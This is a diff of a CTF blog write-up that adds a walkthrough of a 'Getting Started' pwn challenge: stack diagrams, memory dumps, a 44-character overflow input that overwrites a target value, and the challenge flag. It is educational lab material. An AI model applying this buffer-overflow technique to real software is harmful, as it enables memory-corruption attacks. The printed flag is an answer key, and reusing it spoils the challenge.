@@ -13,8 +13,8 @@ This is my first CTF that I have entered though I continue to complete rooms on 
 I've come to understand during this short experience - there's nothing quite like a live CTF. I hope to continue doing CTFs in future, at least, as much as time allows.
 
 (Will be adding more over time).
-- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle, extraterrestrial persistence, initialise connection, questionnaire
-- **Posts to follow:** getting started, initialise connection, critical flight, debut, and timed transmission
+- **Posts Added:** trapped source, persistence, plaintext tleasure, alien cradle, extraterrestrial persistence, initialise connection, questionnaire, getting started
+- **Posts to follow:** critical flight, debut, and timed transmission
 
 
 ## Warmup
@@ -379,3 +379,126 @@ HTB{th30ry_bef0r3_4cti0n}
 ## Getting Started (pwn) [Very Easy]
 -------------------------
 
+Assuming that the pwn challeges were completed in sequential order, then the questionnaire already provided some knowledge for the current one.
+This time, we connect with nc to do the following:
+
+``` bash
+nc ip-address port
+```
+
+Seeing the following output:
+
+``` text
+Stack frame layout 
+
+|      .      | <- Higher addresses
+|      .      |
+|_____________|
+|             | <- 64 bytes
+| Return addr |
+|_____________|
+|             | <- 56 bytes
+|     RBP     |
+|_____________|
+|             | <- 48 bytes
+|   target    |
+|_____________|
+|             | <- 40 bytes
+|  alignment  |
+|_____________|
+|             | <- 32 bytes
+|  Buffer[31] |
+|_____________|
+|      .      |
+|      .      |
+|_____________|
+|             |
+|  Buffer[0]  |
+|_____________| <- Lower addresses
+```
+
+We get to learn about the stack, or in this case, how information is stored on the stack as well as creating a Buffer Overflow:
+
+``` text
+
+      [Addr]       |      [Value]                                                            
+-------------------+-------------------                                                      
+0x00007ffd2761aa70 | 0x0000000000000000 <- Start of buffer                                   
+0x00007ffd2761aa78 | 0x0000000000000000                                                      
+0x00007ffd2761aa80 | 0x0000000000000000                                                      
+0x00007ffd2761aa88 | 0x0000000000000000                                                      
+0x00007ffd2761aa90 | 0x6969696969696969 <- Dummy value for alignment                         
+0x00007ffd2761aa98 | 0x00000000deadbeef <- Target to change                                  
+0x00007ffd2761aaa0 | 0x000055eb89122800 <- Saved rbp                                         
+0x00007ffd2761aaa8 | 0x00007f94b6eb8c87 <- Saved return address                              
+0x00007ffd2761aab0 | 0x0000000000000001                                                      
+0x00007ffd2761aab8 | 0x00007ffd2761ab88                                                      
+                                           
+
+
+After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:   
+                                                                                             
+                                                                                             
+      [Addr]       |      [Value]                                                            
+-------------------+-------------------                                                      
+0x00007ffeeb1994a0 | 0x0000000041414141 <- Start of buffer                                   
+0x00007ffeeb1994a8 | 0x0000000000000000                                                      
+0x00007ffeeb1994b0 | 0x0000000000000000                                                      
+0x00007ffeeb1994b8 | 0x0000000000000000                                                      
+0x00007ffeeb1994c0 | 0x6969696969696969 <- Dummy value for alignment                         
+0x00007ffeeb1994c8 | 0x00000000deadbeef <- Target to change                                  
+0x00007ffeeb1994d0 | 0x0000555abf8b5800 <- Saved rbp                                         
+0x00007ffeeb1994d8 | 0x00007ff3ca40fc87 <- Saved return address                              
+0x00007ffeeb1994e0 | 0x0000000000000001                                                      
+0x00007ffeeb1994e8 | 0x00007ffeeb1995b8    
+
+
+After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:                                                                                          
+                                                                                             
+                                                                                             
+      [Addr]       |      [Value]                                                            
+-------------------+-------------------                                                      
+0x00007ffeeb1994a0 | 0x4242424241414141 <- Start of buffer                                   
+0x00007ffeeb1994a8 | 0x0000000000000000                                                      
+0x00007ffeeb1994b0 | 0x0000000000000000                                                      
+0x00007ffeeb1994b8 | 0x0000000000000000                                                      
+0x00007ffeeb1994c0 | 0x6969696969696969 <- Dummy value for alignment                         
+0x00007ffeeb1994c8 | 0x00000000deadbeef <- Target to change                                  
+0x00007ffeeb1994d0 | 0x0000555abf8b5800 <- Saved rbp                                         
+0x00007ffeeb1994d8 | 0x00007ff3ca40fc87 <- Saved return address                              
+0x00007ffeeb1994e0 | 0x0000000000000001                                                      
+0x00007ffeeb1994e8 | 0x00007ffeeb1995b8  
+
+```
+
+We are then tasked to do the following:
+
+``` text 
+     ◉                                                                                       
+◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉  
+
+>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+
+Considering how the letters filled the respective addresses above, I calculated about 44 characters to be the amount to overwrite **0xdeadbeef**.
+
+``` text
+      [Addr]       |      [Value]                                                            
+-------------------+-------------------                                                      
+0x00007ffd2761aa70 | 0x6161616161616161 <- Start of buffer                                   
+0x00007ffd2761aa78 | 0x6161616161616161                                                      
+0x00007ffd2761aa80 | 0x6161616161616161                                                      
+0x00007ffd2761aa88 | 0x6161616161616161                                                      
+0x00007ffd2761aa90 | 0x6161616161616161 <- Dummy value for alignment                         
+0x00007ffd2761aa98 | 0x0000000061616161 <- Target to change                                  
+0x00007ffd2761aaa0 | 0x000055eb89122800 <- Saved rbp                                         
+0x00007ffd2761aaa8 | 0x00007f94b6eb8c87 <- Saved return address                              
+0x00007ffd2761aab0 | 0x0000000000000001                                                      
+0x00007ffd2761aab8 | 0x00007ffd2761ab88 
+```
+
+We get the flag:
+
+``` text
+HTB{b0f_s33m5_3z_r1ght?}
+```
